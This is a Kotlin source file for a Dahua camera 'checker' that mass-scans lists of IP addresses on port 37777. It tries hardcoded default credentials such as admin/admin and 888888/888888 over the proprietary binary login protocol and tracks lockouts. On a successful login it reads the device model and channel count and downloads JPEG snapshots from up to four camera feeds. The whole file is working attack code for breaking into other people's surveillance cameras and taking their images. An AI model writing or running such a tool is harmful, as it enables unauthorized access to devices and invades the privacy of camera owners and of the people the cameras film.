package com.dahua.checker

import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket

data class ScanResult(
    val ip: String,
    val port: Int,
    val login: String,
    val password: String,
    val model: String,
    val channels: Int,
    val snapshot: ByteArray?,
    val blocked: Boolean = false,
    val timestampMs: Long = System.currentTimeMillis()
)

data class ScanProgress(
    val total: Int,
    val checked: Int,
    val successful: Int,
    val blocked: Int,
    val elapsedMs: Long,
    val finished: Boolean = false,
    val cancelled: Boolean = false
)

class DahuaScanner {

    companion object {
        const val DEFAULT_PORT = 37777
        const val TIMEOUT_CONNECT = 3000
        const val TIMEOUT_READ = 11000
        const val TIMEOUT_SNAPSHOT = 4000
        const val BATCH_SIZE = 20
        const val MAX_CONCURRENT = 8

        val CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "123456",
            "666666" to "666666",
            "888888" to "888888",
            "default" to "tluafed",
            "admin" to "admin123",
            "user" to "user",
            "admin" to ""
        )

        // Garbage patterns from asleep_scanner для очистки JPEG
        // JPEG_GARBAGE1 = b'\x0a%b\x00\x00\x0a\x00\x00\x00'
        // JPEG_GARBAGE2 = b'\xbc\x00\x00\x00\x00\x80\x00\x00%b'
    }

    @Volatile
    var cancelled = false

    private val semaphore = Semaphore(MAX_CONCURRENT)

    suspend fun scan(
        ips: List<String>,
        port: Int = DEFAULT_PORT,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        val total = ips.size
        var checkedCount = 0
        var successCount = 0
        var blockedCount = 0
        val startTime = System.currentTimeMillis()

        for (batchStart in ips.indices step BATCH_SIZE) {
            if (cancelled) break

            val batchEnd = minOf(batchStart + BATCH_SIZE, total)
            val batch = ips.subList(batchStart, batchEnd)

            val results = coroutineScope {
                batch.map { ip ->
                    async(Dispatchers.IO) {
                        if (cancelled) return@async null
                        semaphore.withPermit {
                            if (cancelled) null else tryCredentials(ip, port)
                        }
                    }
                }.awaitAll()
            }

            for (result in results) {
                checkedCount++
                if (result != null) {
                    if (result.blocked) {
                        blockedCount++
                    } else {
                        successCount++
                    }
                    onResult(result)
                }
            }

            val elapsed = System.currentTimeMillis() - startTime
            onProgress(ScanProgress(total, checkedCount, successCount, blockedCount, elapsed))

            if (cancelled) break
        }

        val elapsed = System.currentTimeMillis() - startTime
        onProgress(
            ScanProgress(
                total, checkedCount, successCount, blockedCount, elapsed,
                finished = !cancelled,
                cancelled = cancelled
            )
        )
    }

    private fun tryCredentials(ip: String, port: Int): ScanResult? {
        for ((login, password) in CREDENTIALS) {
            if (cancelled) return null
            var socket: Socket? = null
            try {
                socket = Socket()
                socket.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
                socket.soTimeout = TIMEOUT_READ

                val output = socket.getOutputStream()
                val input = socket.getInputStream()

                val authStatus = sendLogin(output, input, login, password)

                if (authStatus == AuthStatus.BLOCKED) {
                    socket.close()
                    return ScanResult(ip, port, login, password, "", 0, null, blocked = true)
                }

                if (authStatus != AuthStatus.SUCCESS) {
                    socket.close()
                    continue
                }

                // Авторизация OK — получаем модель
                val model = try {
                    getModel(output, input)
                } catch (_: Exception) {
                    "unknown"
                }

                // Получаем кол-во каналов
                val channels = try {
                    getChannelsCount(output, input)
                } catch (_: Exception) {
                    1
                }

                // Снапшоты — пробуем каналы
                for (ch in 0 until minOf(channels, 4)) {
                    try {
                        socket.soTimeout = TIMEOUT_SNAPSHOT
                        val photo = getSnapshot(output, input, ch)
                        socket.soTimeout = TIMEOUT_READ
                        if (photo != null && photo.size > 100) {
                            try { socket.close() } catch (_: Exception) {}
                            return ScanResult(ip, port, login, password, model, channels, photo)
                        }
                    } catch (_: Exception) {
                        // dead channel
                    }
                }

                try { socket.close() } catch (_: Exception) {}
                return ScanResult(ip, port, login, password, model, channels, null)

            } catch (_: Exception) {
                try { socket?.close() } catch (_: Exception) {}
                continue
            }
        }
        return null
    }

    private enum class AuthStatus { SUCCESS, BLOCKED, FAIL }

    private fun sendLogin(output: OutputStream, input: InputStream, login: String, password: String): AuthStatus {
        // Точная реплика LOGIN_TEMPLATE из asleep_scanner/dahua.py:
        // LOGIN_TEMPLATE = b'\xa0\x00\x00\x60%b\x00\x00\x00%b%b%b%b\x04\x01\x00\x00\x00\x00\xa1\xaa%b&&%b\x00Random:%b\r\n\r\n'
        // socket.send(LOGIN_TEMPLATE % (
        //   struct.pack('b', 24 + len(login) + len(password)),
        //   login.encode('ascii'), (8 - len(login)) * b'\x00',
        //   password.encode('ascii'), (8 - len(password)) * b'\x00',
        //   login.encode('ascii'), password.encode('ascii'),
        //   str(int(time.time())).encode('ascii')
        // ))

        val loginAscii = login.toByteArray(Charsets.US_ASCII)
        val passAscii = password.toByteArray(Charsets.US_ASCII)

        val loginPadded = ByteArray(8)
        loginAscii.copyInto(loginPadded, 0, 0, minOf(loginAscii.size, 8))
        val passPadded = ByteArray(8)
        passAscii.copyInto(passPadded, 0, 0, minOf(passAscii.size, 8))

        val totalLen = 24 + loginAscii.size + passAscii.size
        if (totalLen > 127) return AuthStatus.FAIL // struct.pack('b', ...) is signed byte, max 127

        val timestamp = (System.currentTimeMillis() / 1000).toString().toByteArray(Charsets.US_ASCII)

        val packet = ByteArrayOutputStream()
        // \xa0\x00\x00\x60
        packet.write(byteArrayOf(0xa0.toByte(), 0x00, 0x00, 0x60))
        // struct.pack('b', totalLen) — signed byte
        packet.write(byteArrayOf(totalLen.toByte()))
        // \x00\x00\x00
        packet.write(byteArrayOf(0x00, 0x00, 0x00))
        // login padded to 8 bytes
        packet.write(loginPadded)
        // password padded to 8 bytes
        packet.write(passPadded)
        // \x04\x01\x00\x00\x00\x00\xa1\xaa
        packet.write(byteArrayOf(0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1.toByte(), 0xaa.toByte()))
        // login + "&&" + password + "\x00Random:" + timestamp + "\r\n\r\n"
        packet.write(loginAscii)
        packet.write("&&".toByteArray(Charsets.US_ASCII))
        packet.write(passAscii)
        packet.write(byteArrayOf(0x00))
        packet.write("Random:".toByteArray(Charsets.US_ASCII))
        packet.write(timestamp)
        packet.write("\r\n\r\n".toByteArray(Charsets.US_ASCII))

        output.write(packet.toByteArray())
        output.flush()

        // Читаем ответ — минимум 10 байт, до 128
        val response = ByteArray(128)
        var totalRead = 0
        val deadline = System.currentTimeMillis() + TIMEOUT_READ
        while (totalRead < 10 && System.currentTimeMillis() < deadline) {
            val r = input.read(response, totalRead, 128 - totalRead)
            if (r == -1) return AuthStatus.FAIL
            totalRead += r
        }
        if (totalRead < 10) return AuthStatus.FAIL

        // data[8] == 0 → success
        // data[8] == 1 && data[9] == 4 → blocked
        if (response[8].toInt() == 0) return AuthStatus.SUCCESS
        if (response[8].toInt() == 1 && response[9].toInt() == 4) return AuthStatus.BLOCKED
        return AuthStatus.FAIL
    }

    private fun getModel(output: OutputStream, input: InputStream): String {
        // GET_PTZ = b'\xa4\x00\x00\x00...0b...'
        val cmd = ByteArray(32)
        cmd[0] = 0xa4.toByte()
        cmd[8] = 0x0b
        output.write(cmd)
        output.flush()

        val data = receiveMsg(input)
        // model = data.split(b'\x00')[0].decode('ascii')
        val zeroIdx = data.indexOf(0x00)
        return if (zeroIdx > 0) {
            String(data, 0, zeroIdx, Charsets.US_ASCII)
        } else if (data.isNotEmpty()) {
            String(data, Charsets.US_ASCII).trim()
        } else {
            "unknown"
        }
    }

    private fun getChannelsCount(output: OutputStream, input: InputStream): Int {
        // GET_CHANNELS = b'\xa8\x00\x00\x00...01...'
        val cmd = ByteArray(32)
        cmd[0] = 0xa8.toByte()
        cmd[8] = 0x01
        output.write(cmd)
        output.flush()

        val data = receiveMsg(input)
        // channels_count = data.count(b'&&') + 1
        val dataStr = String(data, Charsets.US_ASCII)
        val count = "&&".toRegex().findAll(dataStr).count() + 1
        return count
    }

    private fun receiveMsg(input: InputStream): ByteArray {
        // header = socket.recv(32)
        // length = struct.unpack('<H', header[4:6])[0]
        // data = socket.recv(length)
        val header = readExact(input, 32) ?: return ByteArray(0)
        val length = ((header[5].toInt() and 0xFF) shl 8) or (header[4].toInt() and 0xFF)
        if (length <= 0 || length > 65535) return ByteArray(0)
        return readExact(input, length) ?: ByteArray(0)
    }

    private fun getSnapshot(output: OutputStream, input: InputStream, channelId: Int): ByteArray? {
        val chByte = channelId.toByte()

        // GET_SNAPSHOT из asleep_scanner
        val cmd = byteArrayOf(
            0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
            chByte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, chByte, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        )

        output.write(cmd)
        output.flush()

        // receive_msg_2: первые 32 байта первого чанка — мусор (header), пропускаем
        val buffer = ByteArrayOutputStream()
        val chunk = ByteArray(1460)
        val deadline = System.currentTimeMillis() + TIMEOUT_SNAPSHOT
        var firstChunk = true

        while (System.currentTimeMillis() < deadline) {
            try {
                val r = input.read(chunk)
                if (r == -1) break
                if (firstChunk) {
                    // Пропустить первые 32 байта (header) как в receive_msg_2
                    if (r > 32) {
                        buffer.write(chunk, 32, r - 32)
                    }
                    firstChunk = false
                } else {
                    buffer.write(chunk, 0, r)
                }
                val data = buffer.toByteArray()
                if (findMarker(data, 0xFF.toByte(), 0xD9.toByte()) != -1) break
            } catch (_: java.net.SocketTimeoutException) {
                break
            }
        }

        var data = buffer.toByteArray()

        // Очистка garbage как в asleep_scanner
        data = cleanGarbage(data, channelId.toByte())

        val startIdx = findMarker(data, 0xFF.toByte(), 0xD8.toByte())
        val endIdx = findMarker(data, 0xFF.toByte(), 0xD9.toByte())

        if (startIdx != -1 && endIdx != -1 && startIdx < endIdx) {
            val jpeg = data.copyOfRange(startIdx, endIdx + 2)
            return if (jpeg.size > 100) jpeg else null
        }
        return null
    }

    private fun cleanGarbage(data: ByteArray, chByte: Byte): ByteArray {
        // JPEG_GARBAGE1 = b'\x0a%b\x00\x00\x0a\x00\x00\x00' (8 bytes, %b = chByte)
        val garbage1 = byteArrayOf(0x0a, chByte, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00)
        // JPEG_GARBAGE2 = b'\xbc\x00\x00\x00\x00\x80\x00\x00%b' (9 bytes)
        val garbage2 = byteArrayOf(0xbc.toByte(), 0x00, 0x00, 0x00, 0x00, 0x80.toByte(), 0x00, 0x00, chByte)

        var result = data

        // garbage1: найти позицию, вычесть 24 назад, удалить блок [pos-24 .. pos+8]
        var changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage1)
            if (pos != -1) {
                val tStart = maxOf(0, pos - 24)
                val tEnd = pos + garbage1.size
                result = removeRange(result, tStart, tEnd)
                changed = true
            }
        }

        // garbage2: найти позицию, удалить 32 байта начиная с этой позиции
        changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage2)
            if (pos != -1) {
                val tEnd = minOf(pos + 32, result.size)
                result = removeRange(result, pos, tEnd)
                changed = true
            }
        }

        return result
    }

    private fun removeRange(data: ByteArray, from: Int, to: Int): ByteArray {
        val out = ByteArray(data.size - (to - from))
        data.copyInto(out, 0, 0, from)
        data.copyInto(out, from, to, data.size)
        return out
    }

    private fun findPattern(data: ByteArray, pattern: ByteArray): Int {
        for (i in 0..data.size - pattern.size) {
            var match = true
            for (j in pattern.indices) {
                if (data[i + j] != pattern[j]) {
                    match = false
                    break
                }
            }
            if (match) return i
        }
        return -1
    }

    private fun findMarker(data: ByteArray, b1: Byte, b2: Byte): Int {
        for (i in 0 until data.size - 1) {
            if (data[i] == b1 && data[i + 1] == b2) return i
        }
        return -1
    }

    private fun readExact(input: InputStream, size: Int): ByteArray? {
        val buf = ByteArray(size)
        var off = 0
        while (off < size) {
            val r = input.read(buf, off, size - off)
            if (r == -1) return if (off > 0) buf.copyOf(off) else null
            off += r
        }
        return buf
    }
}
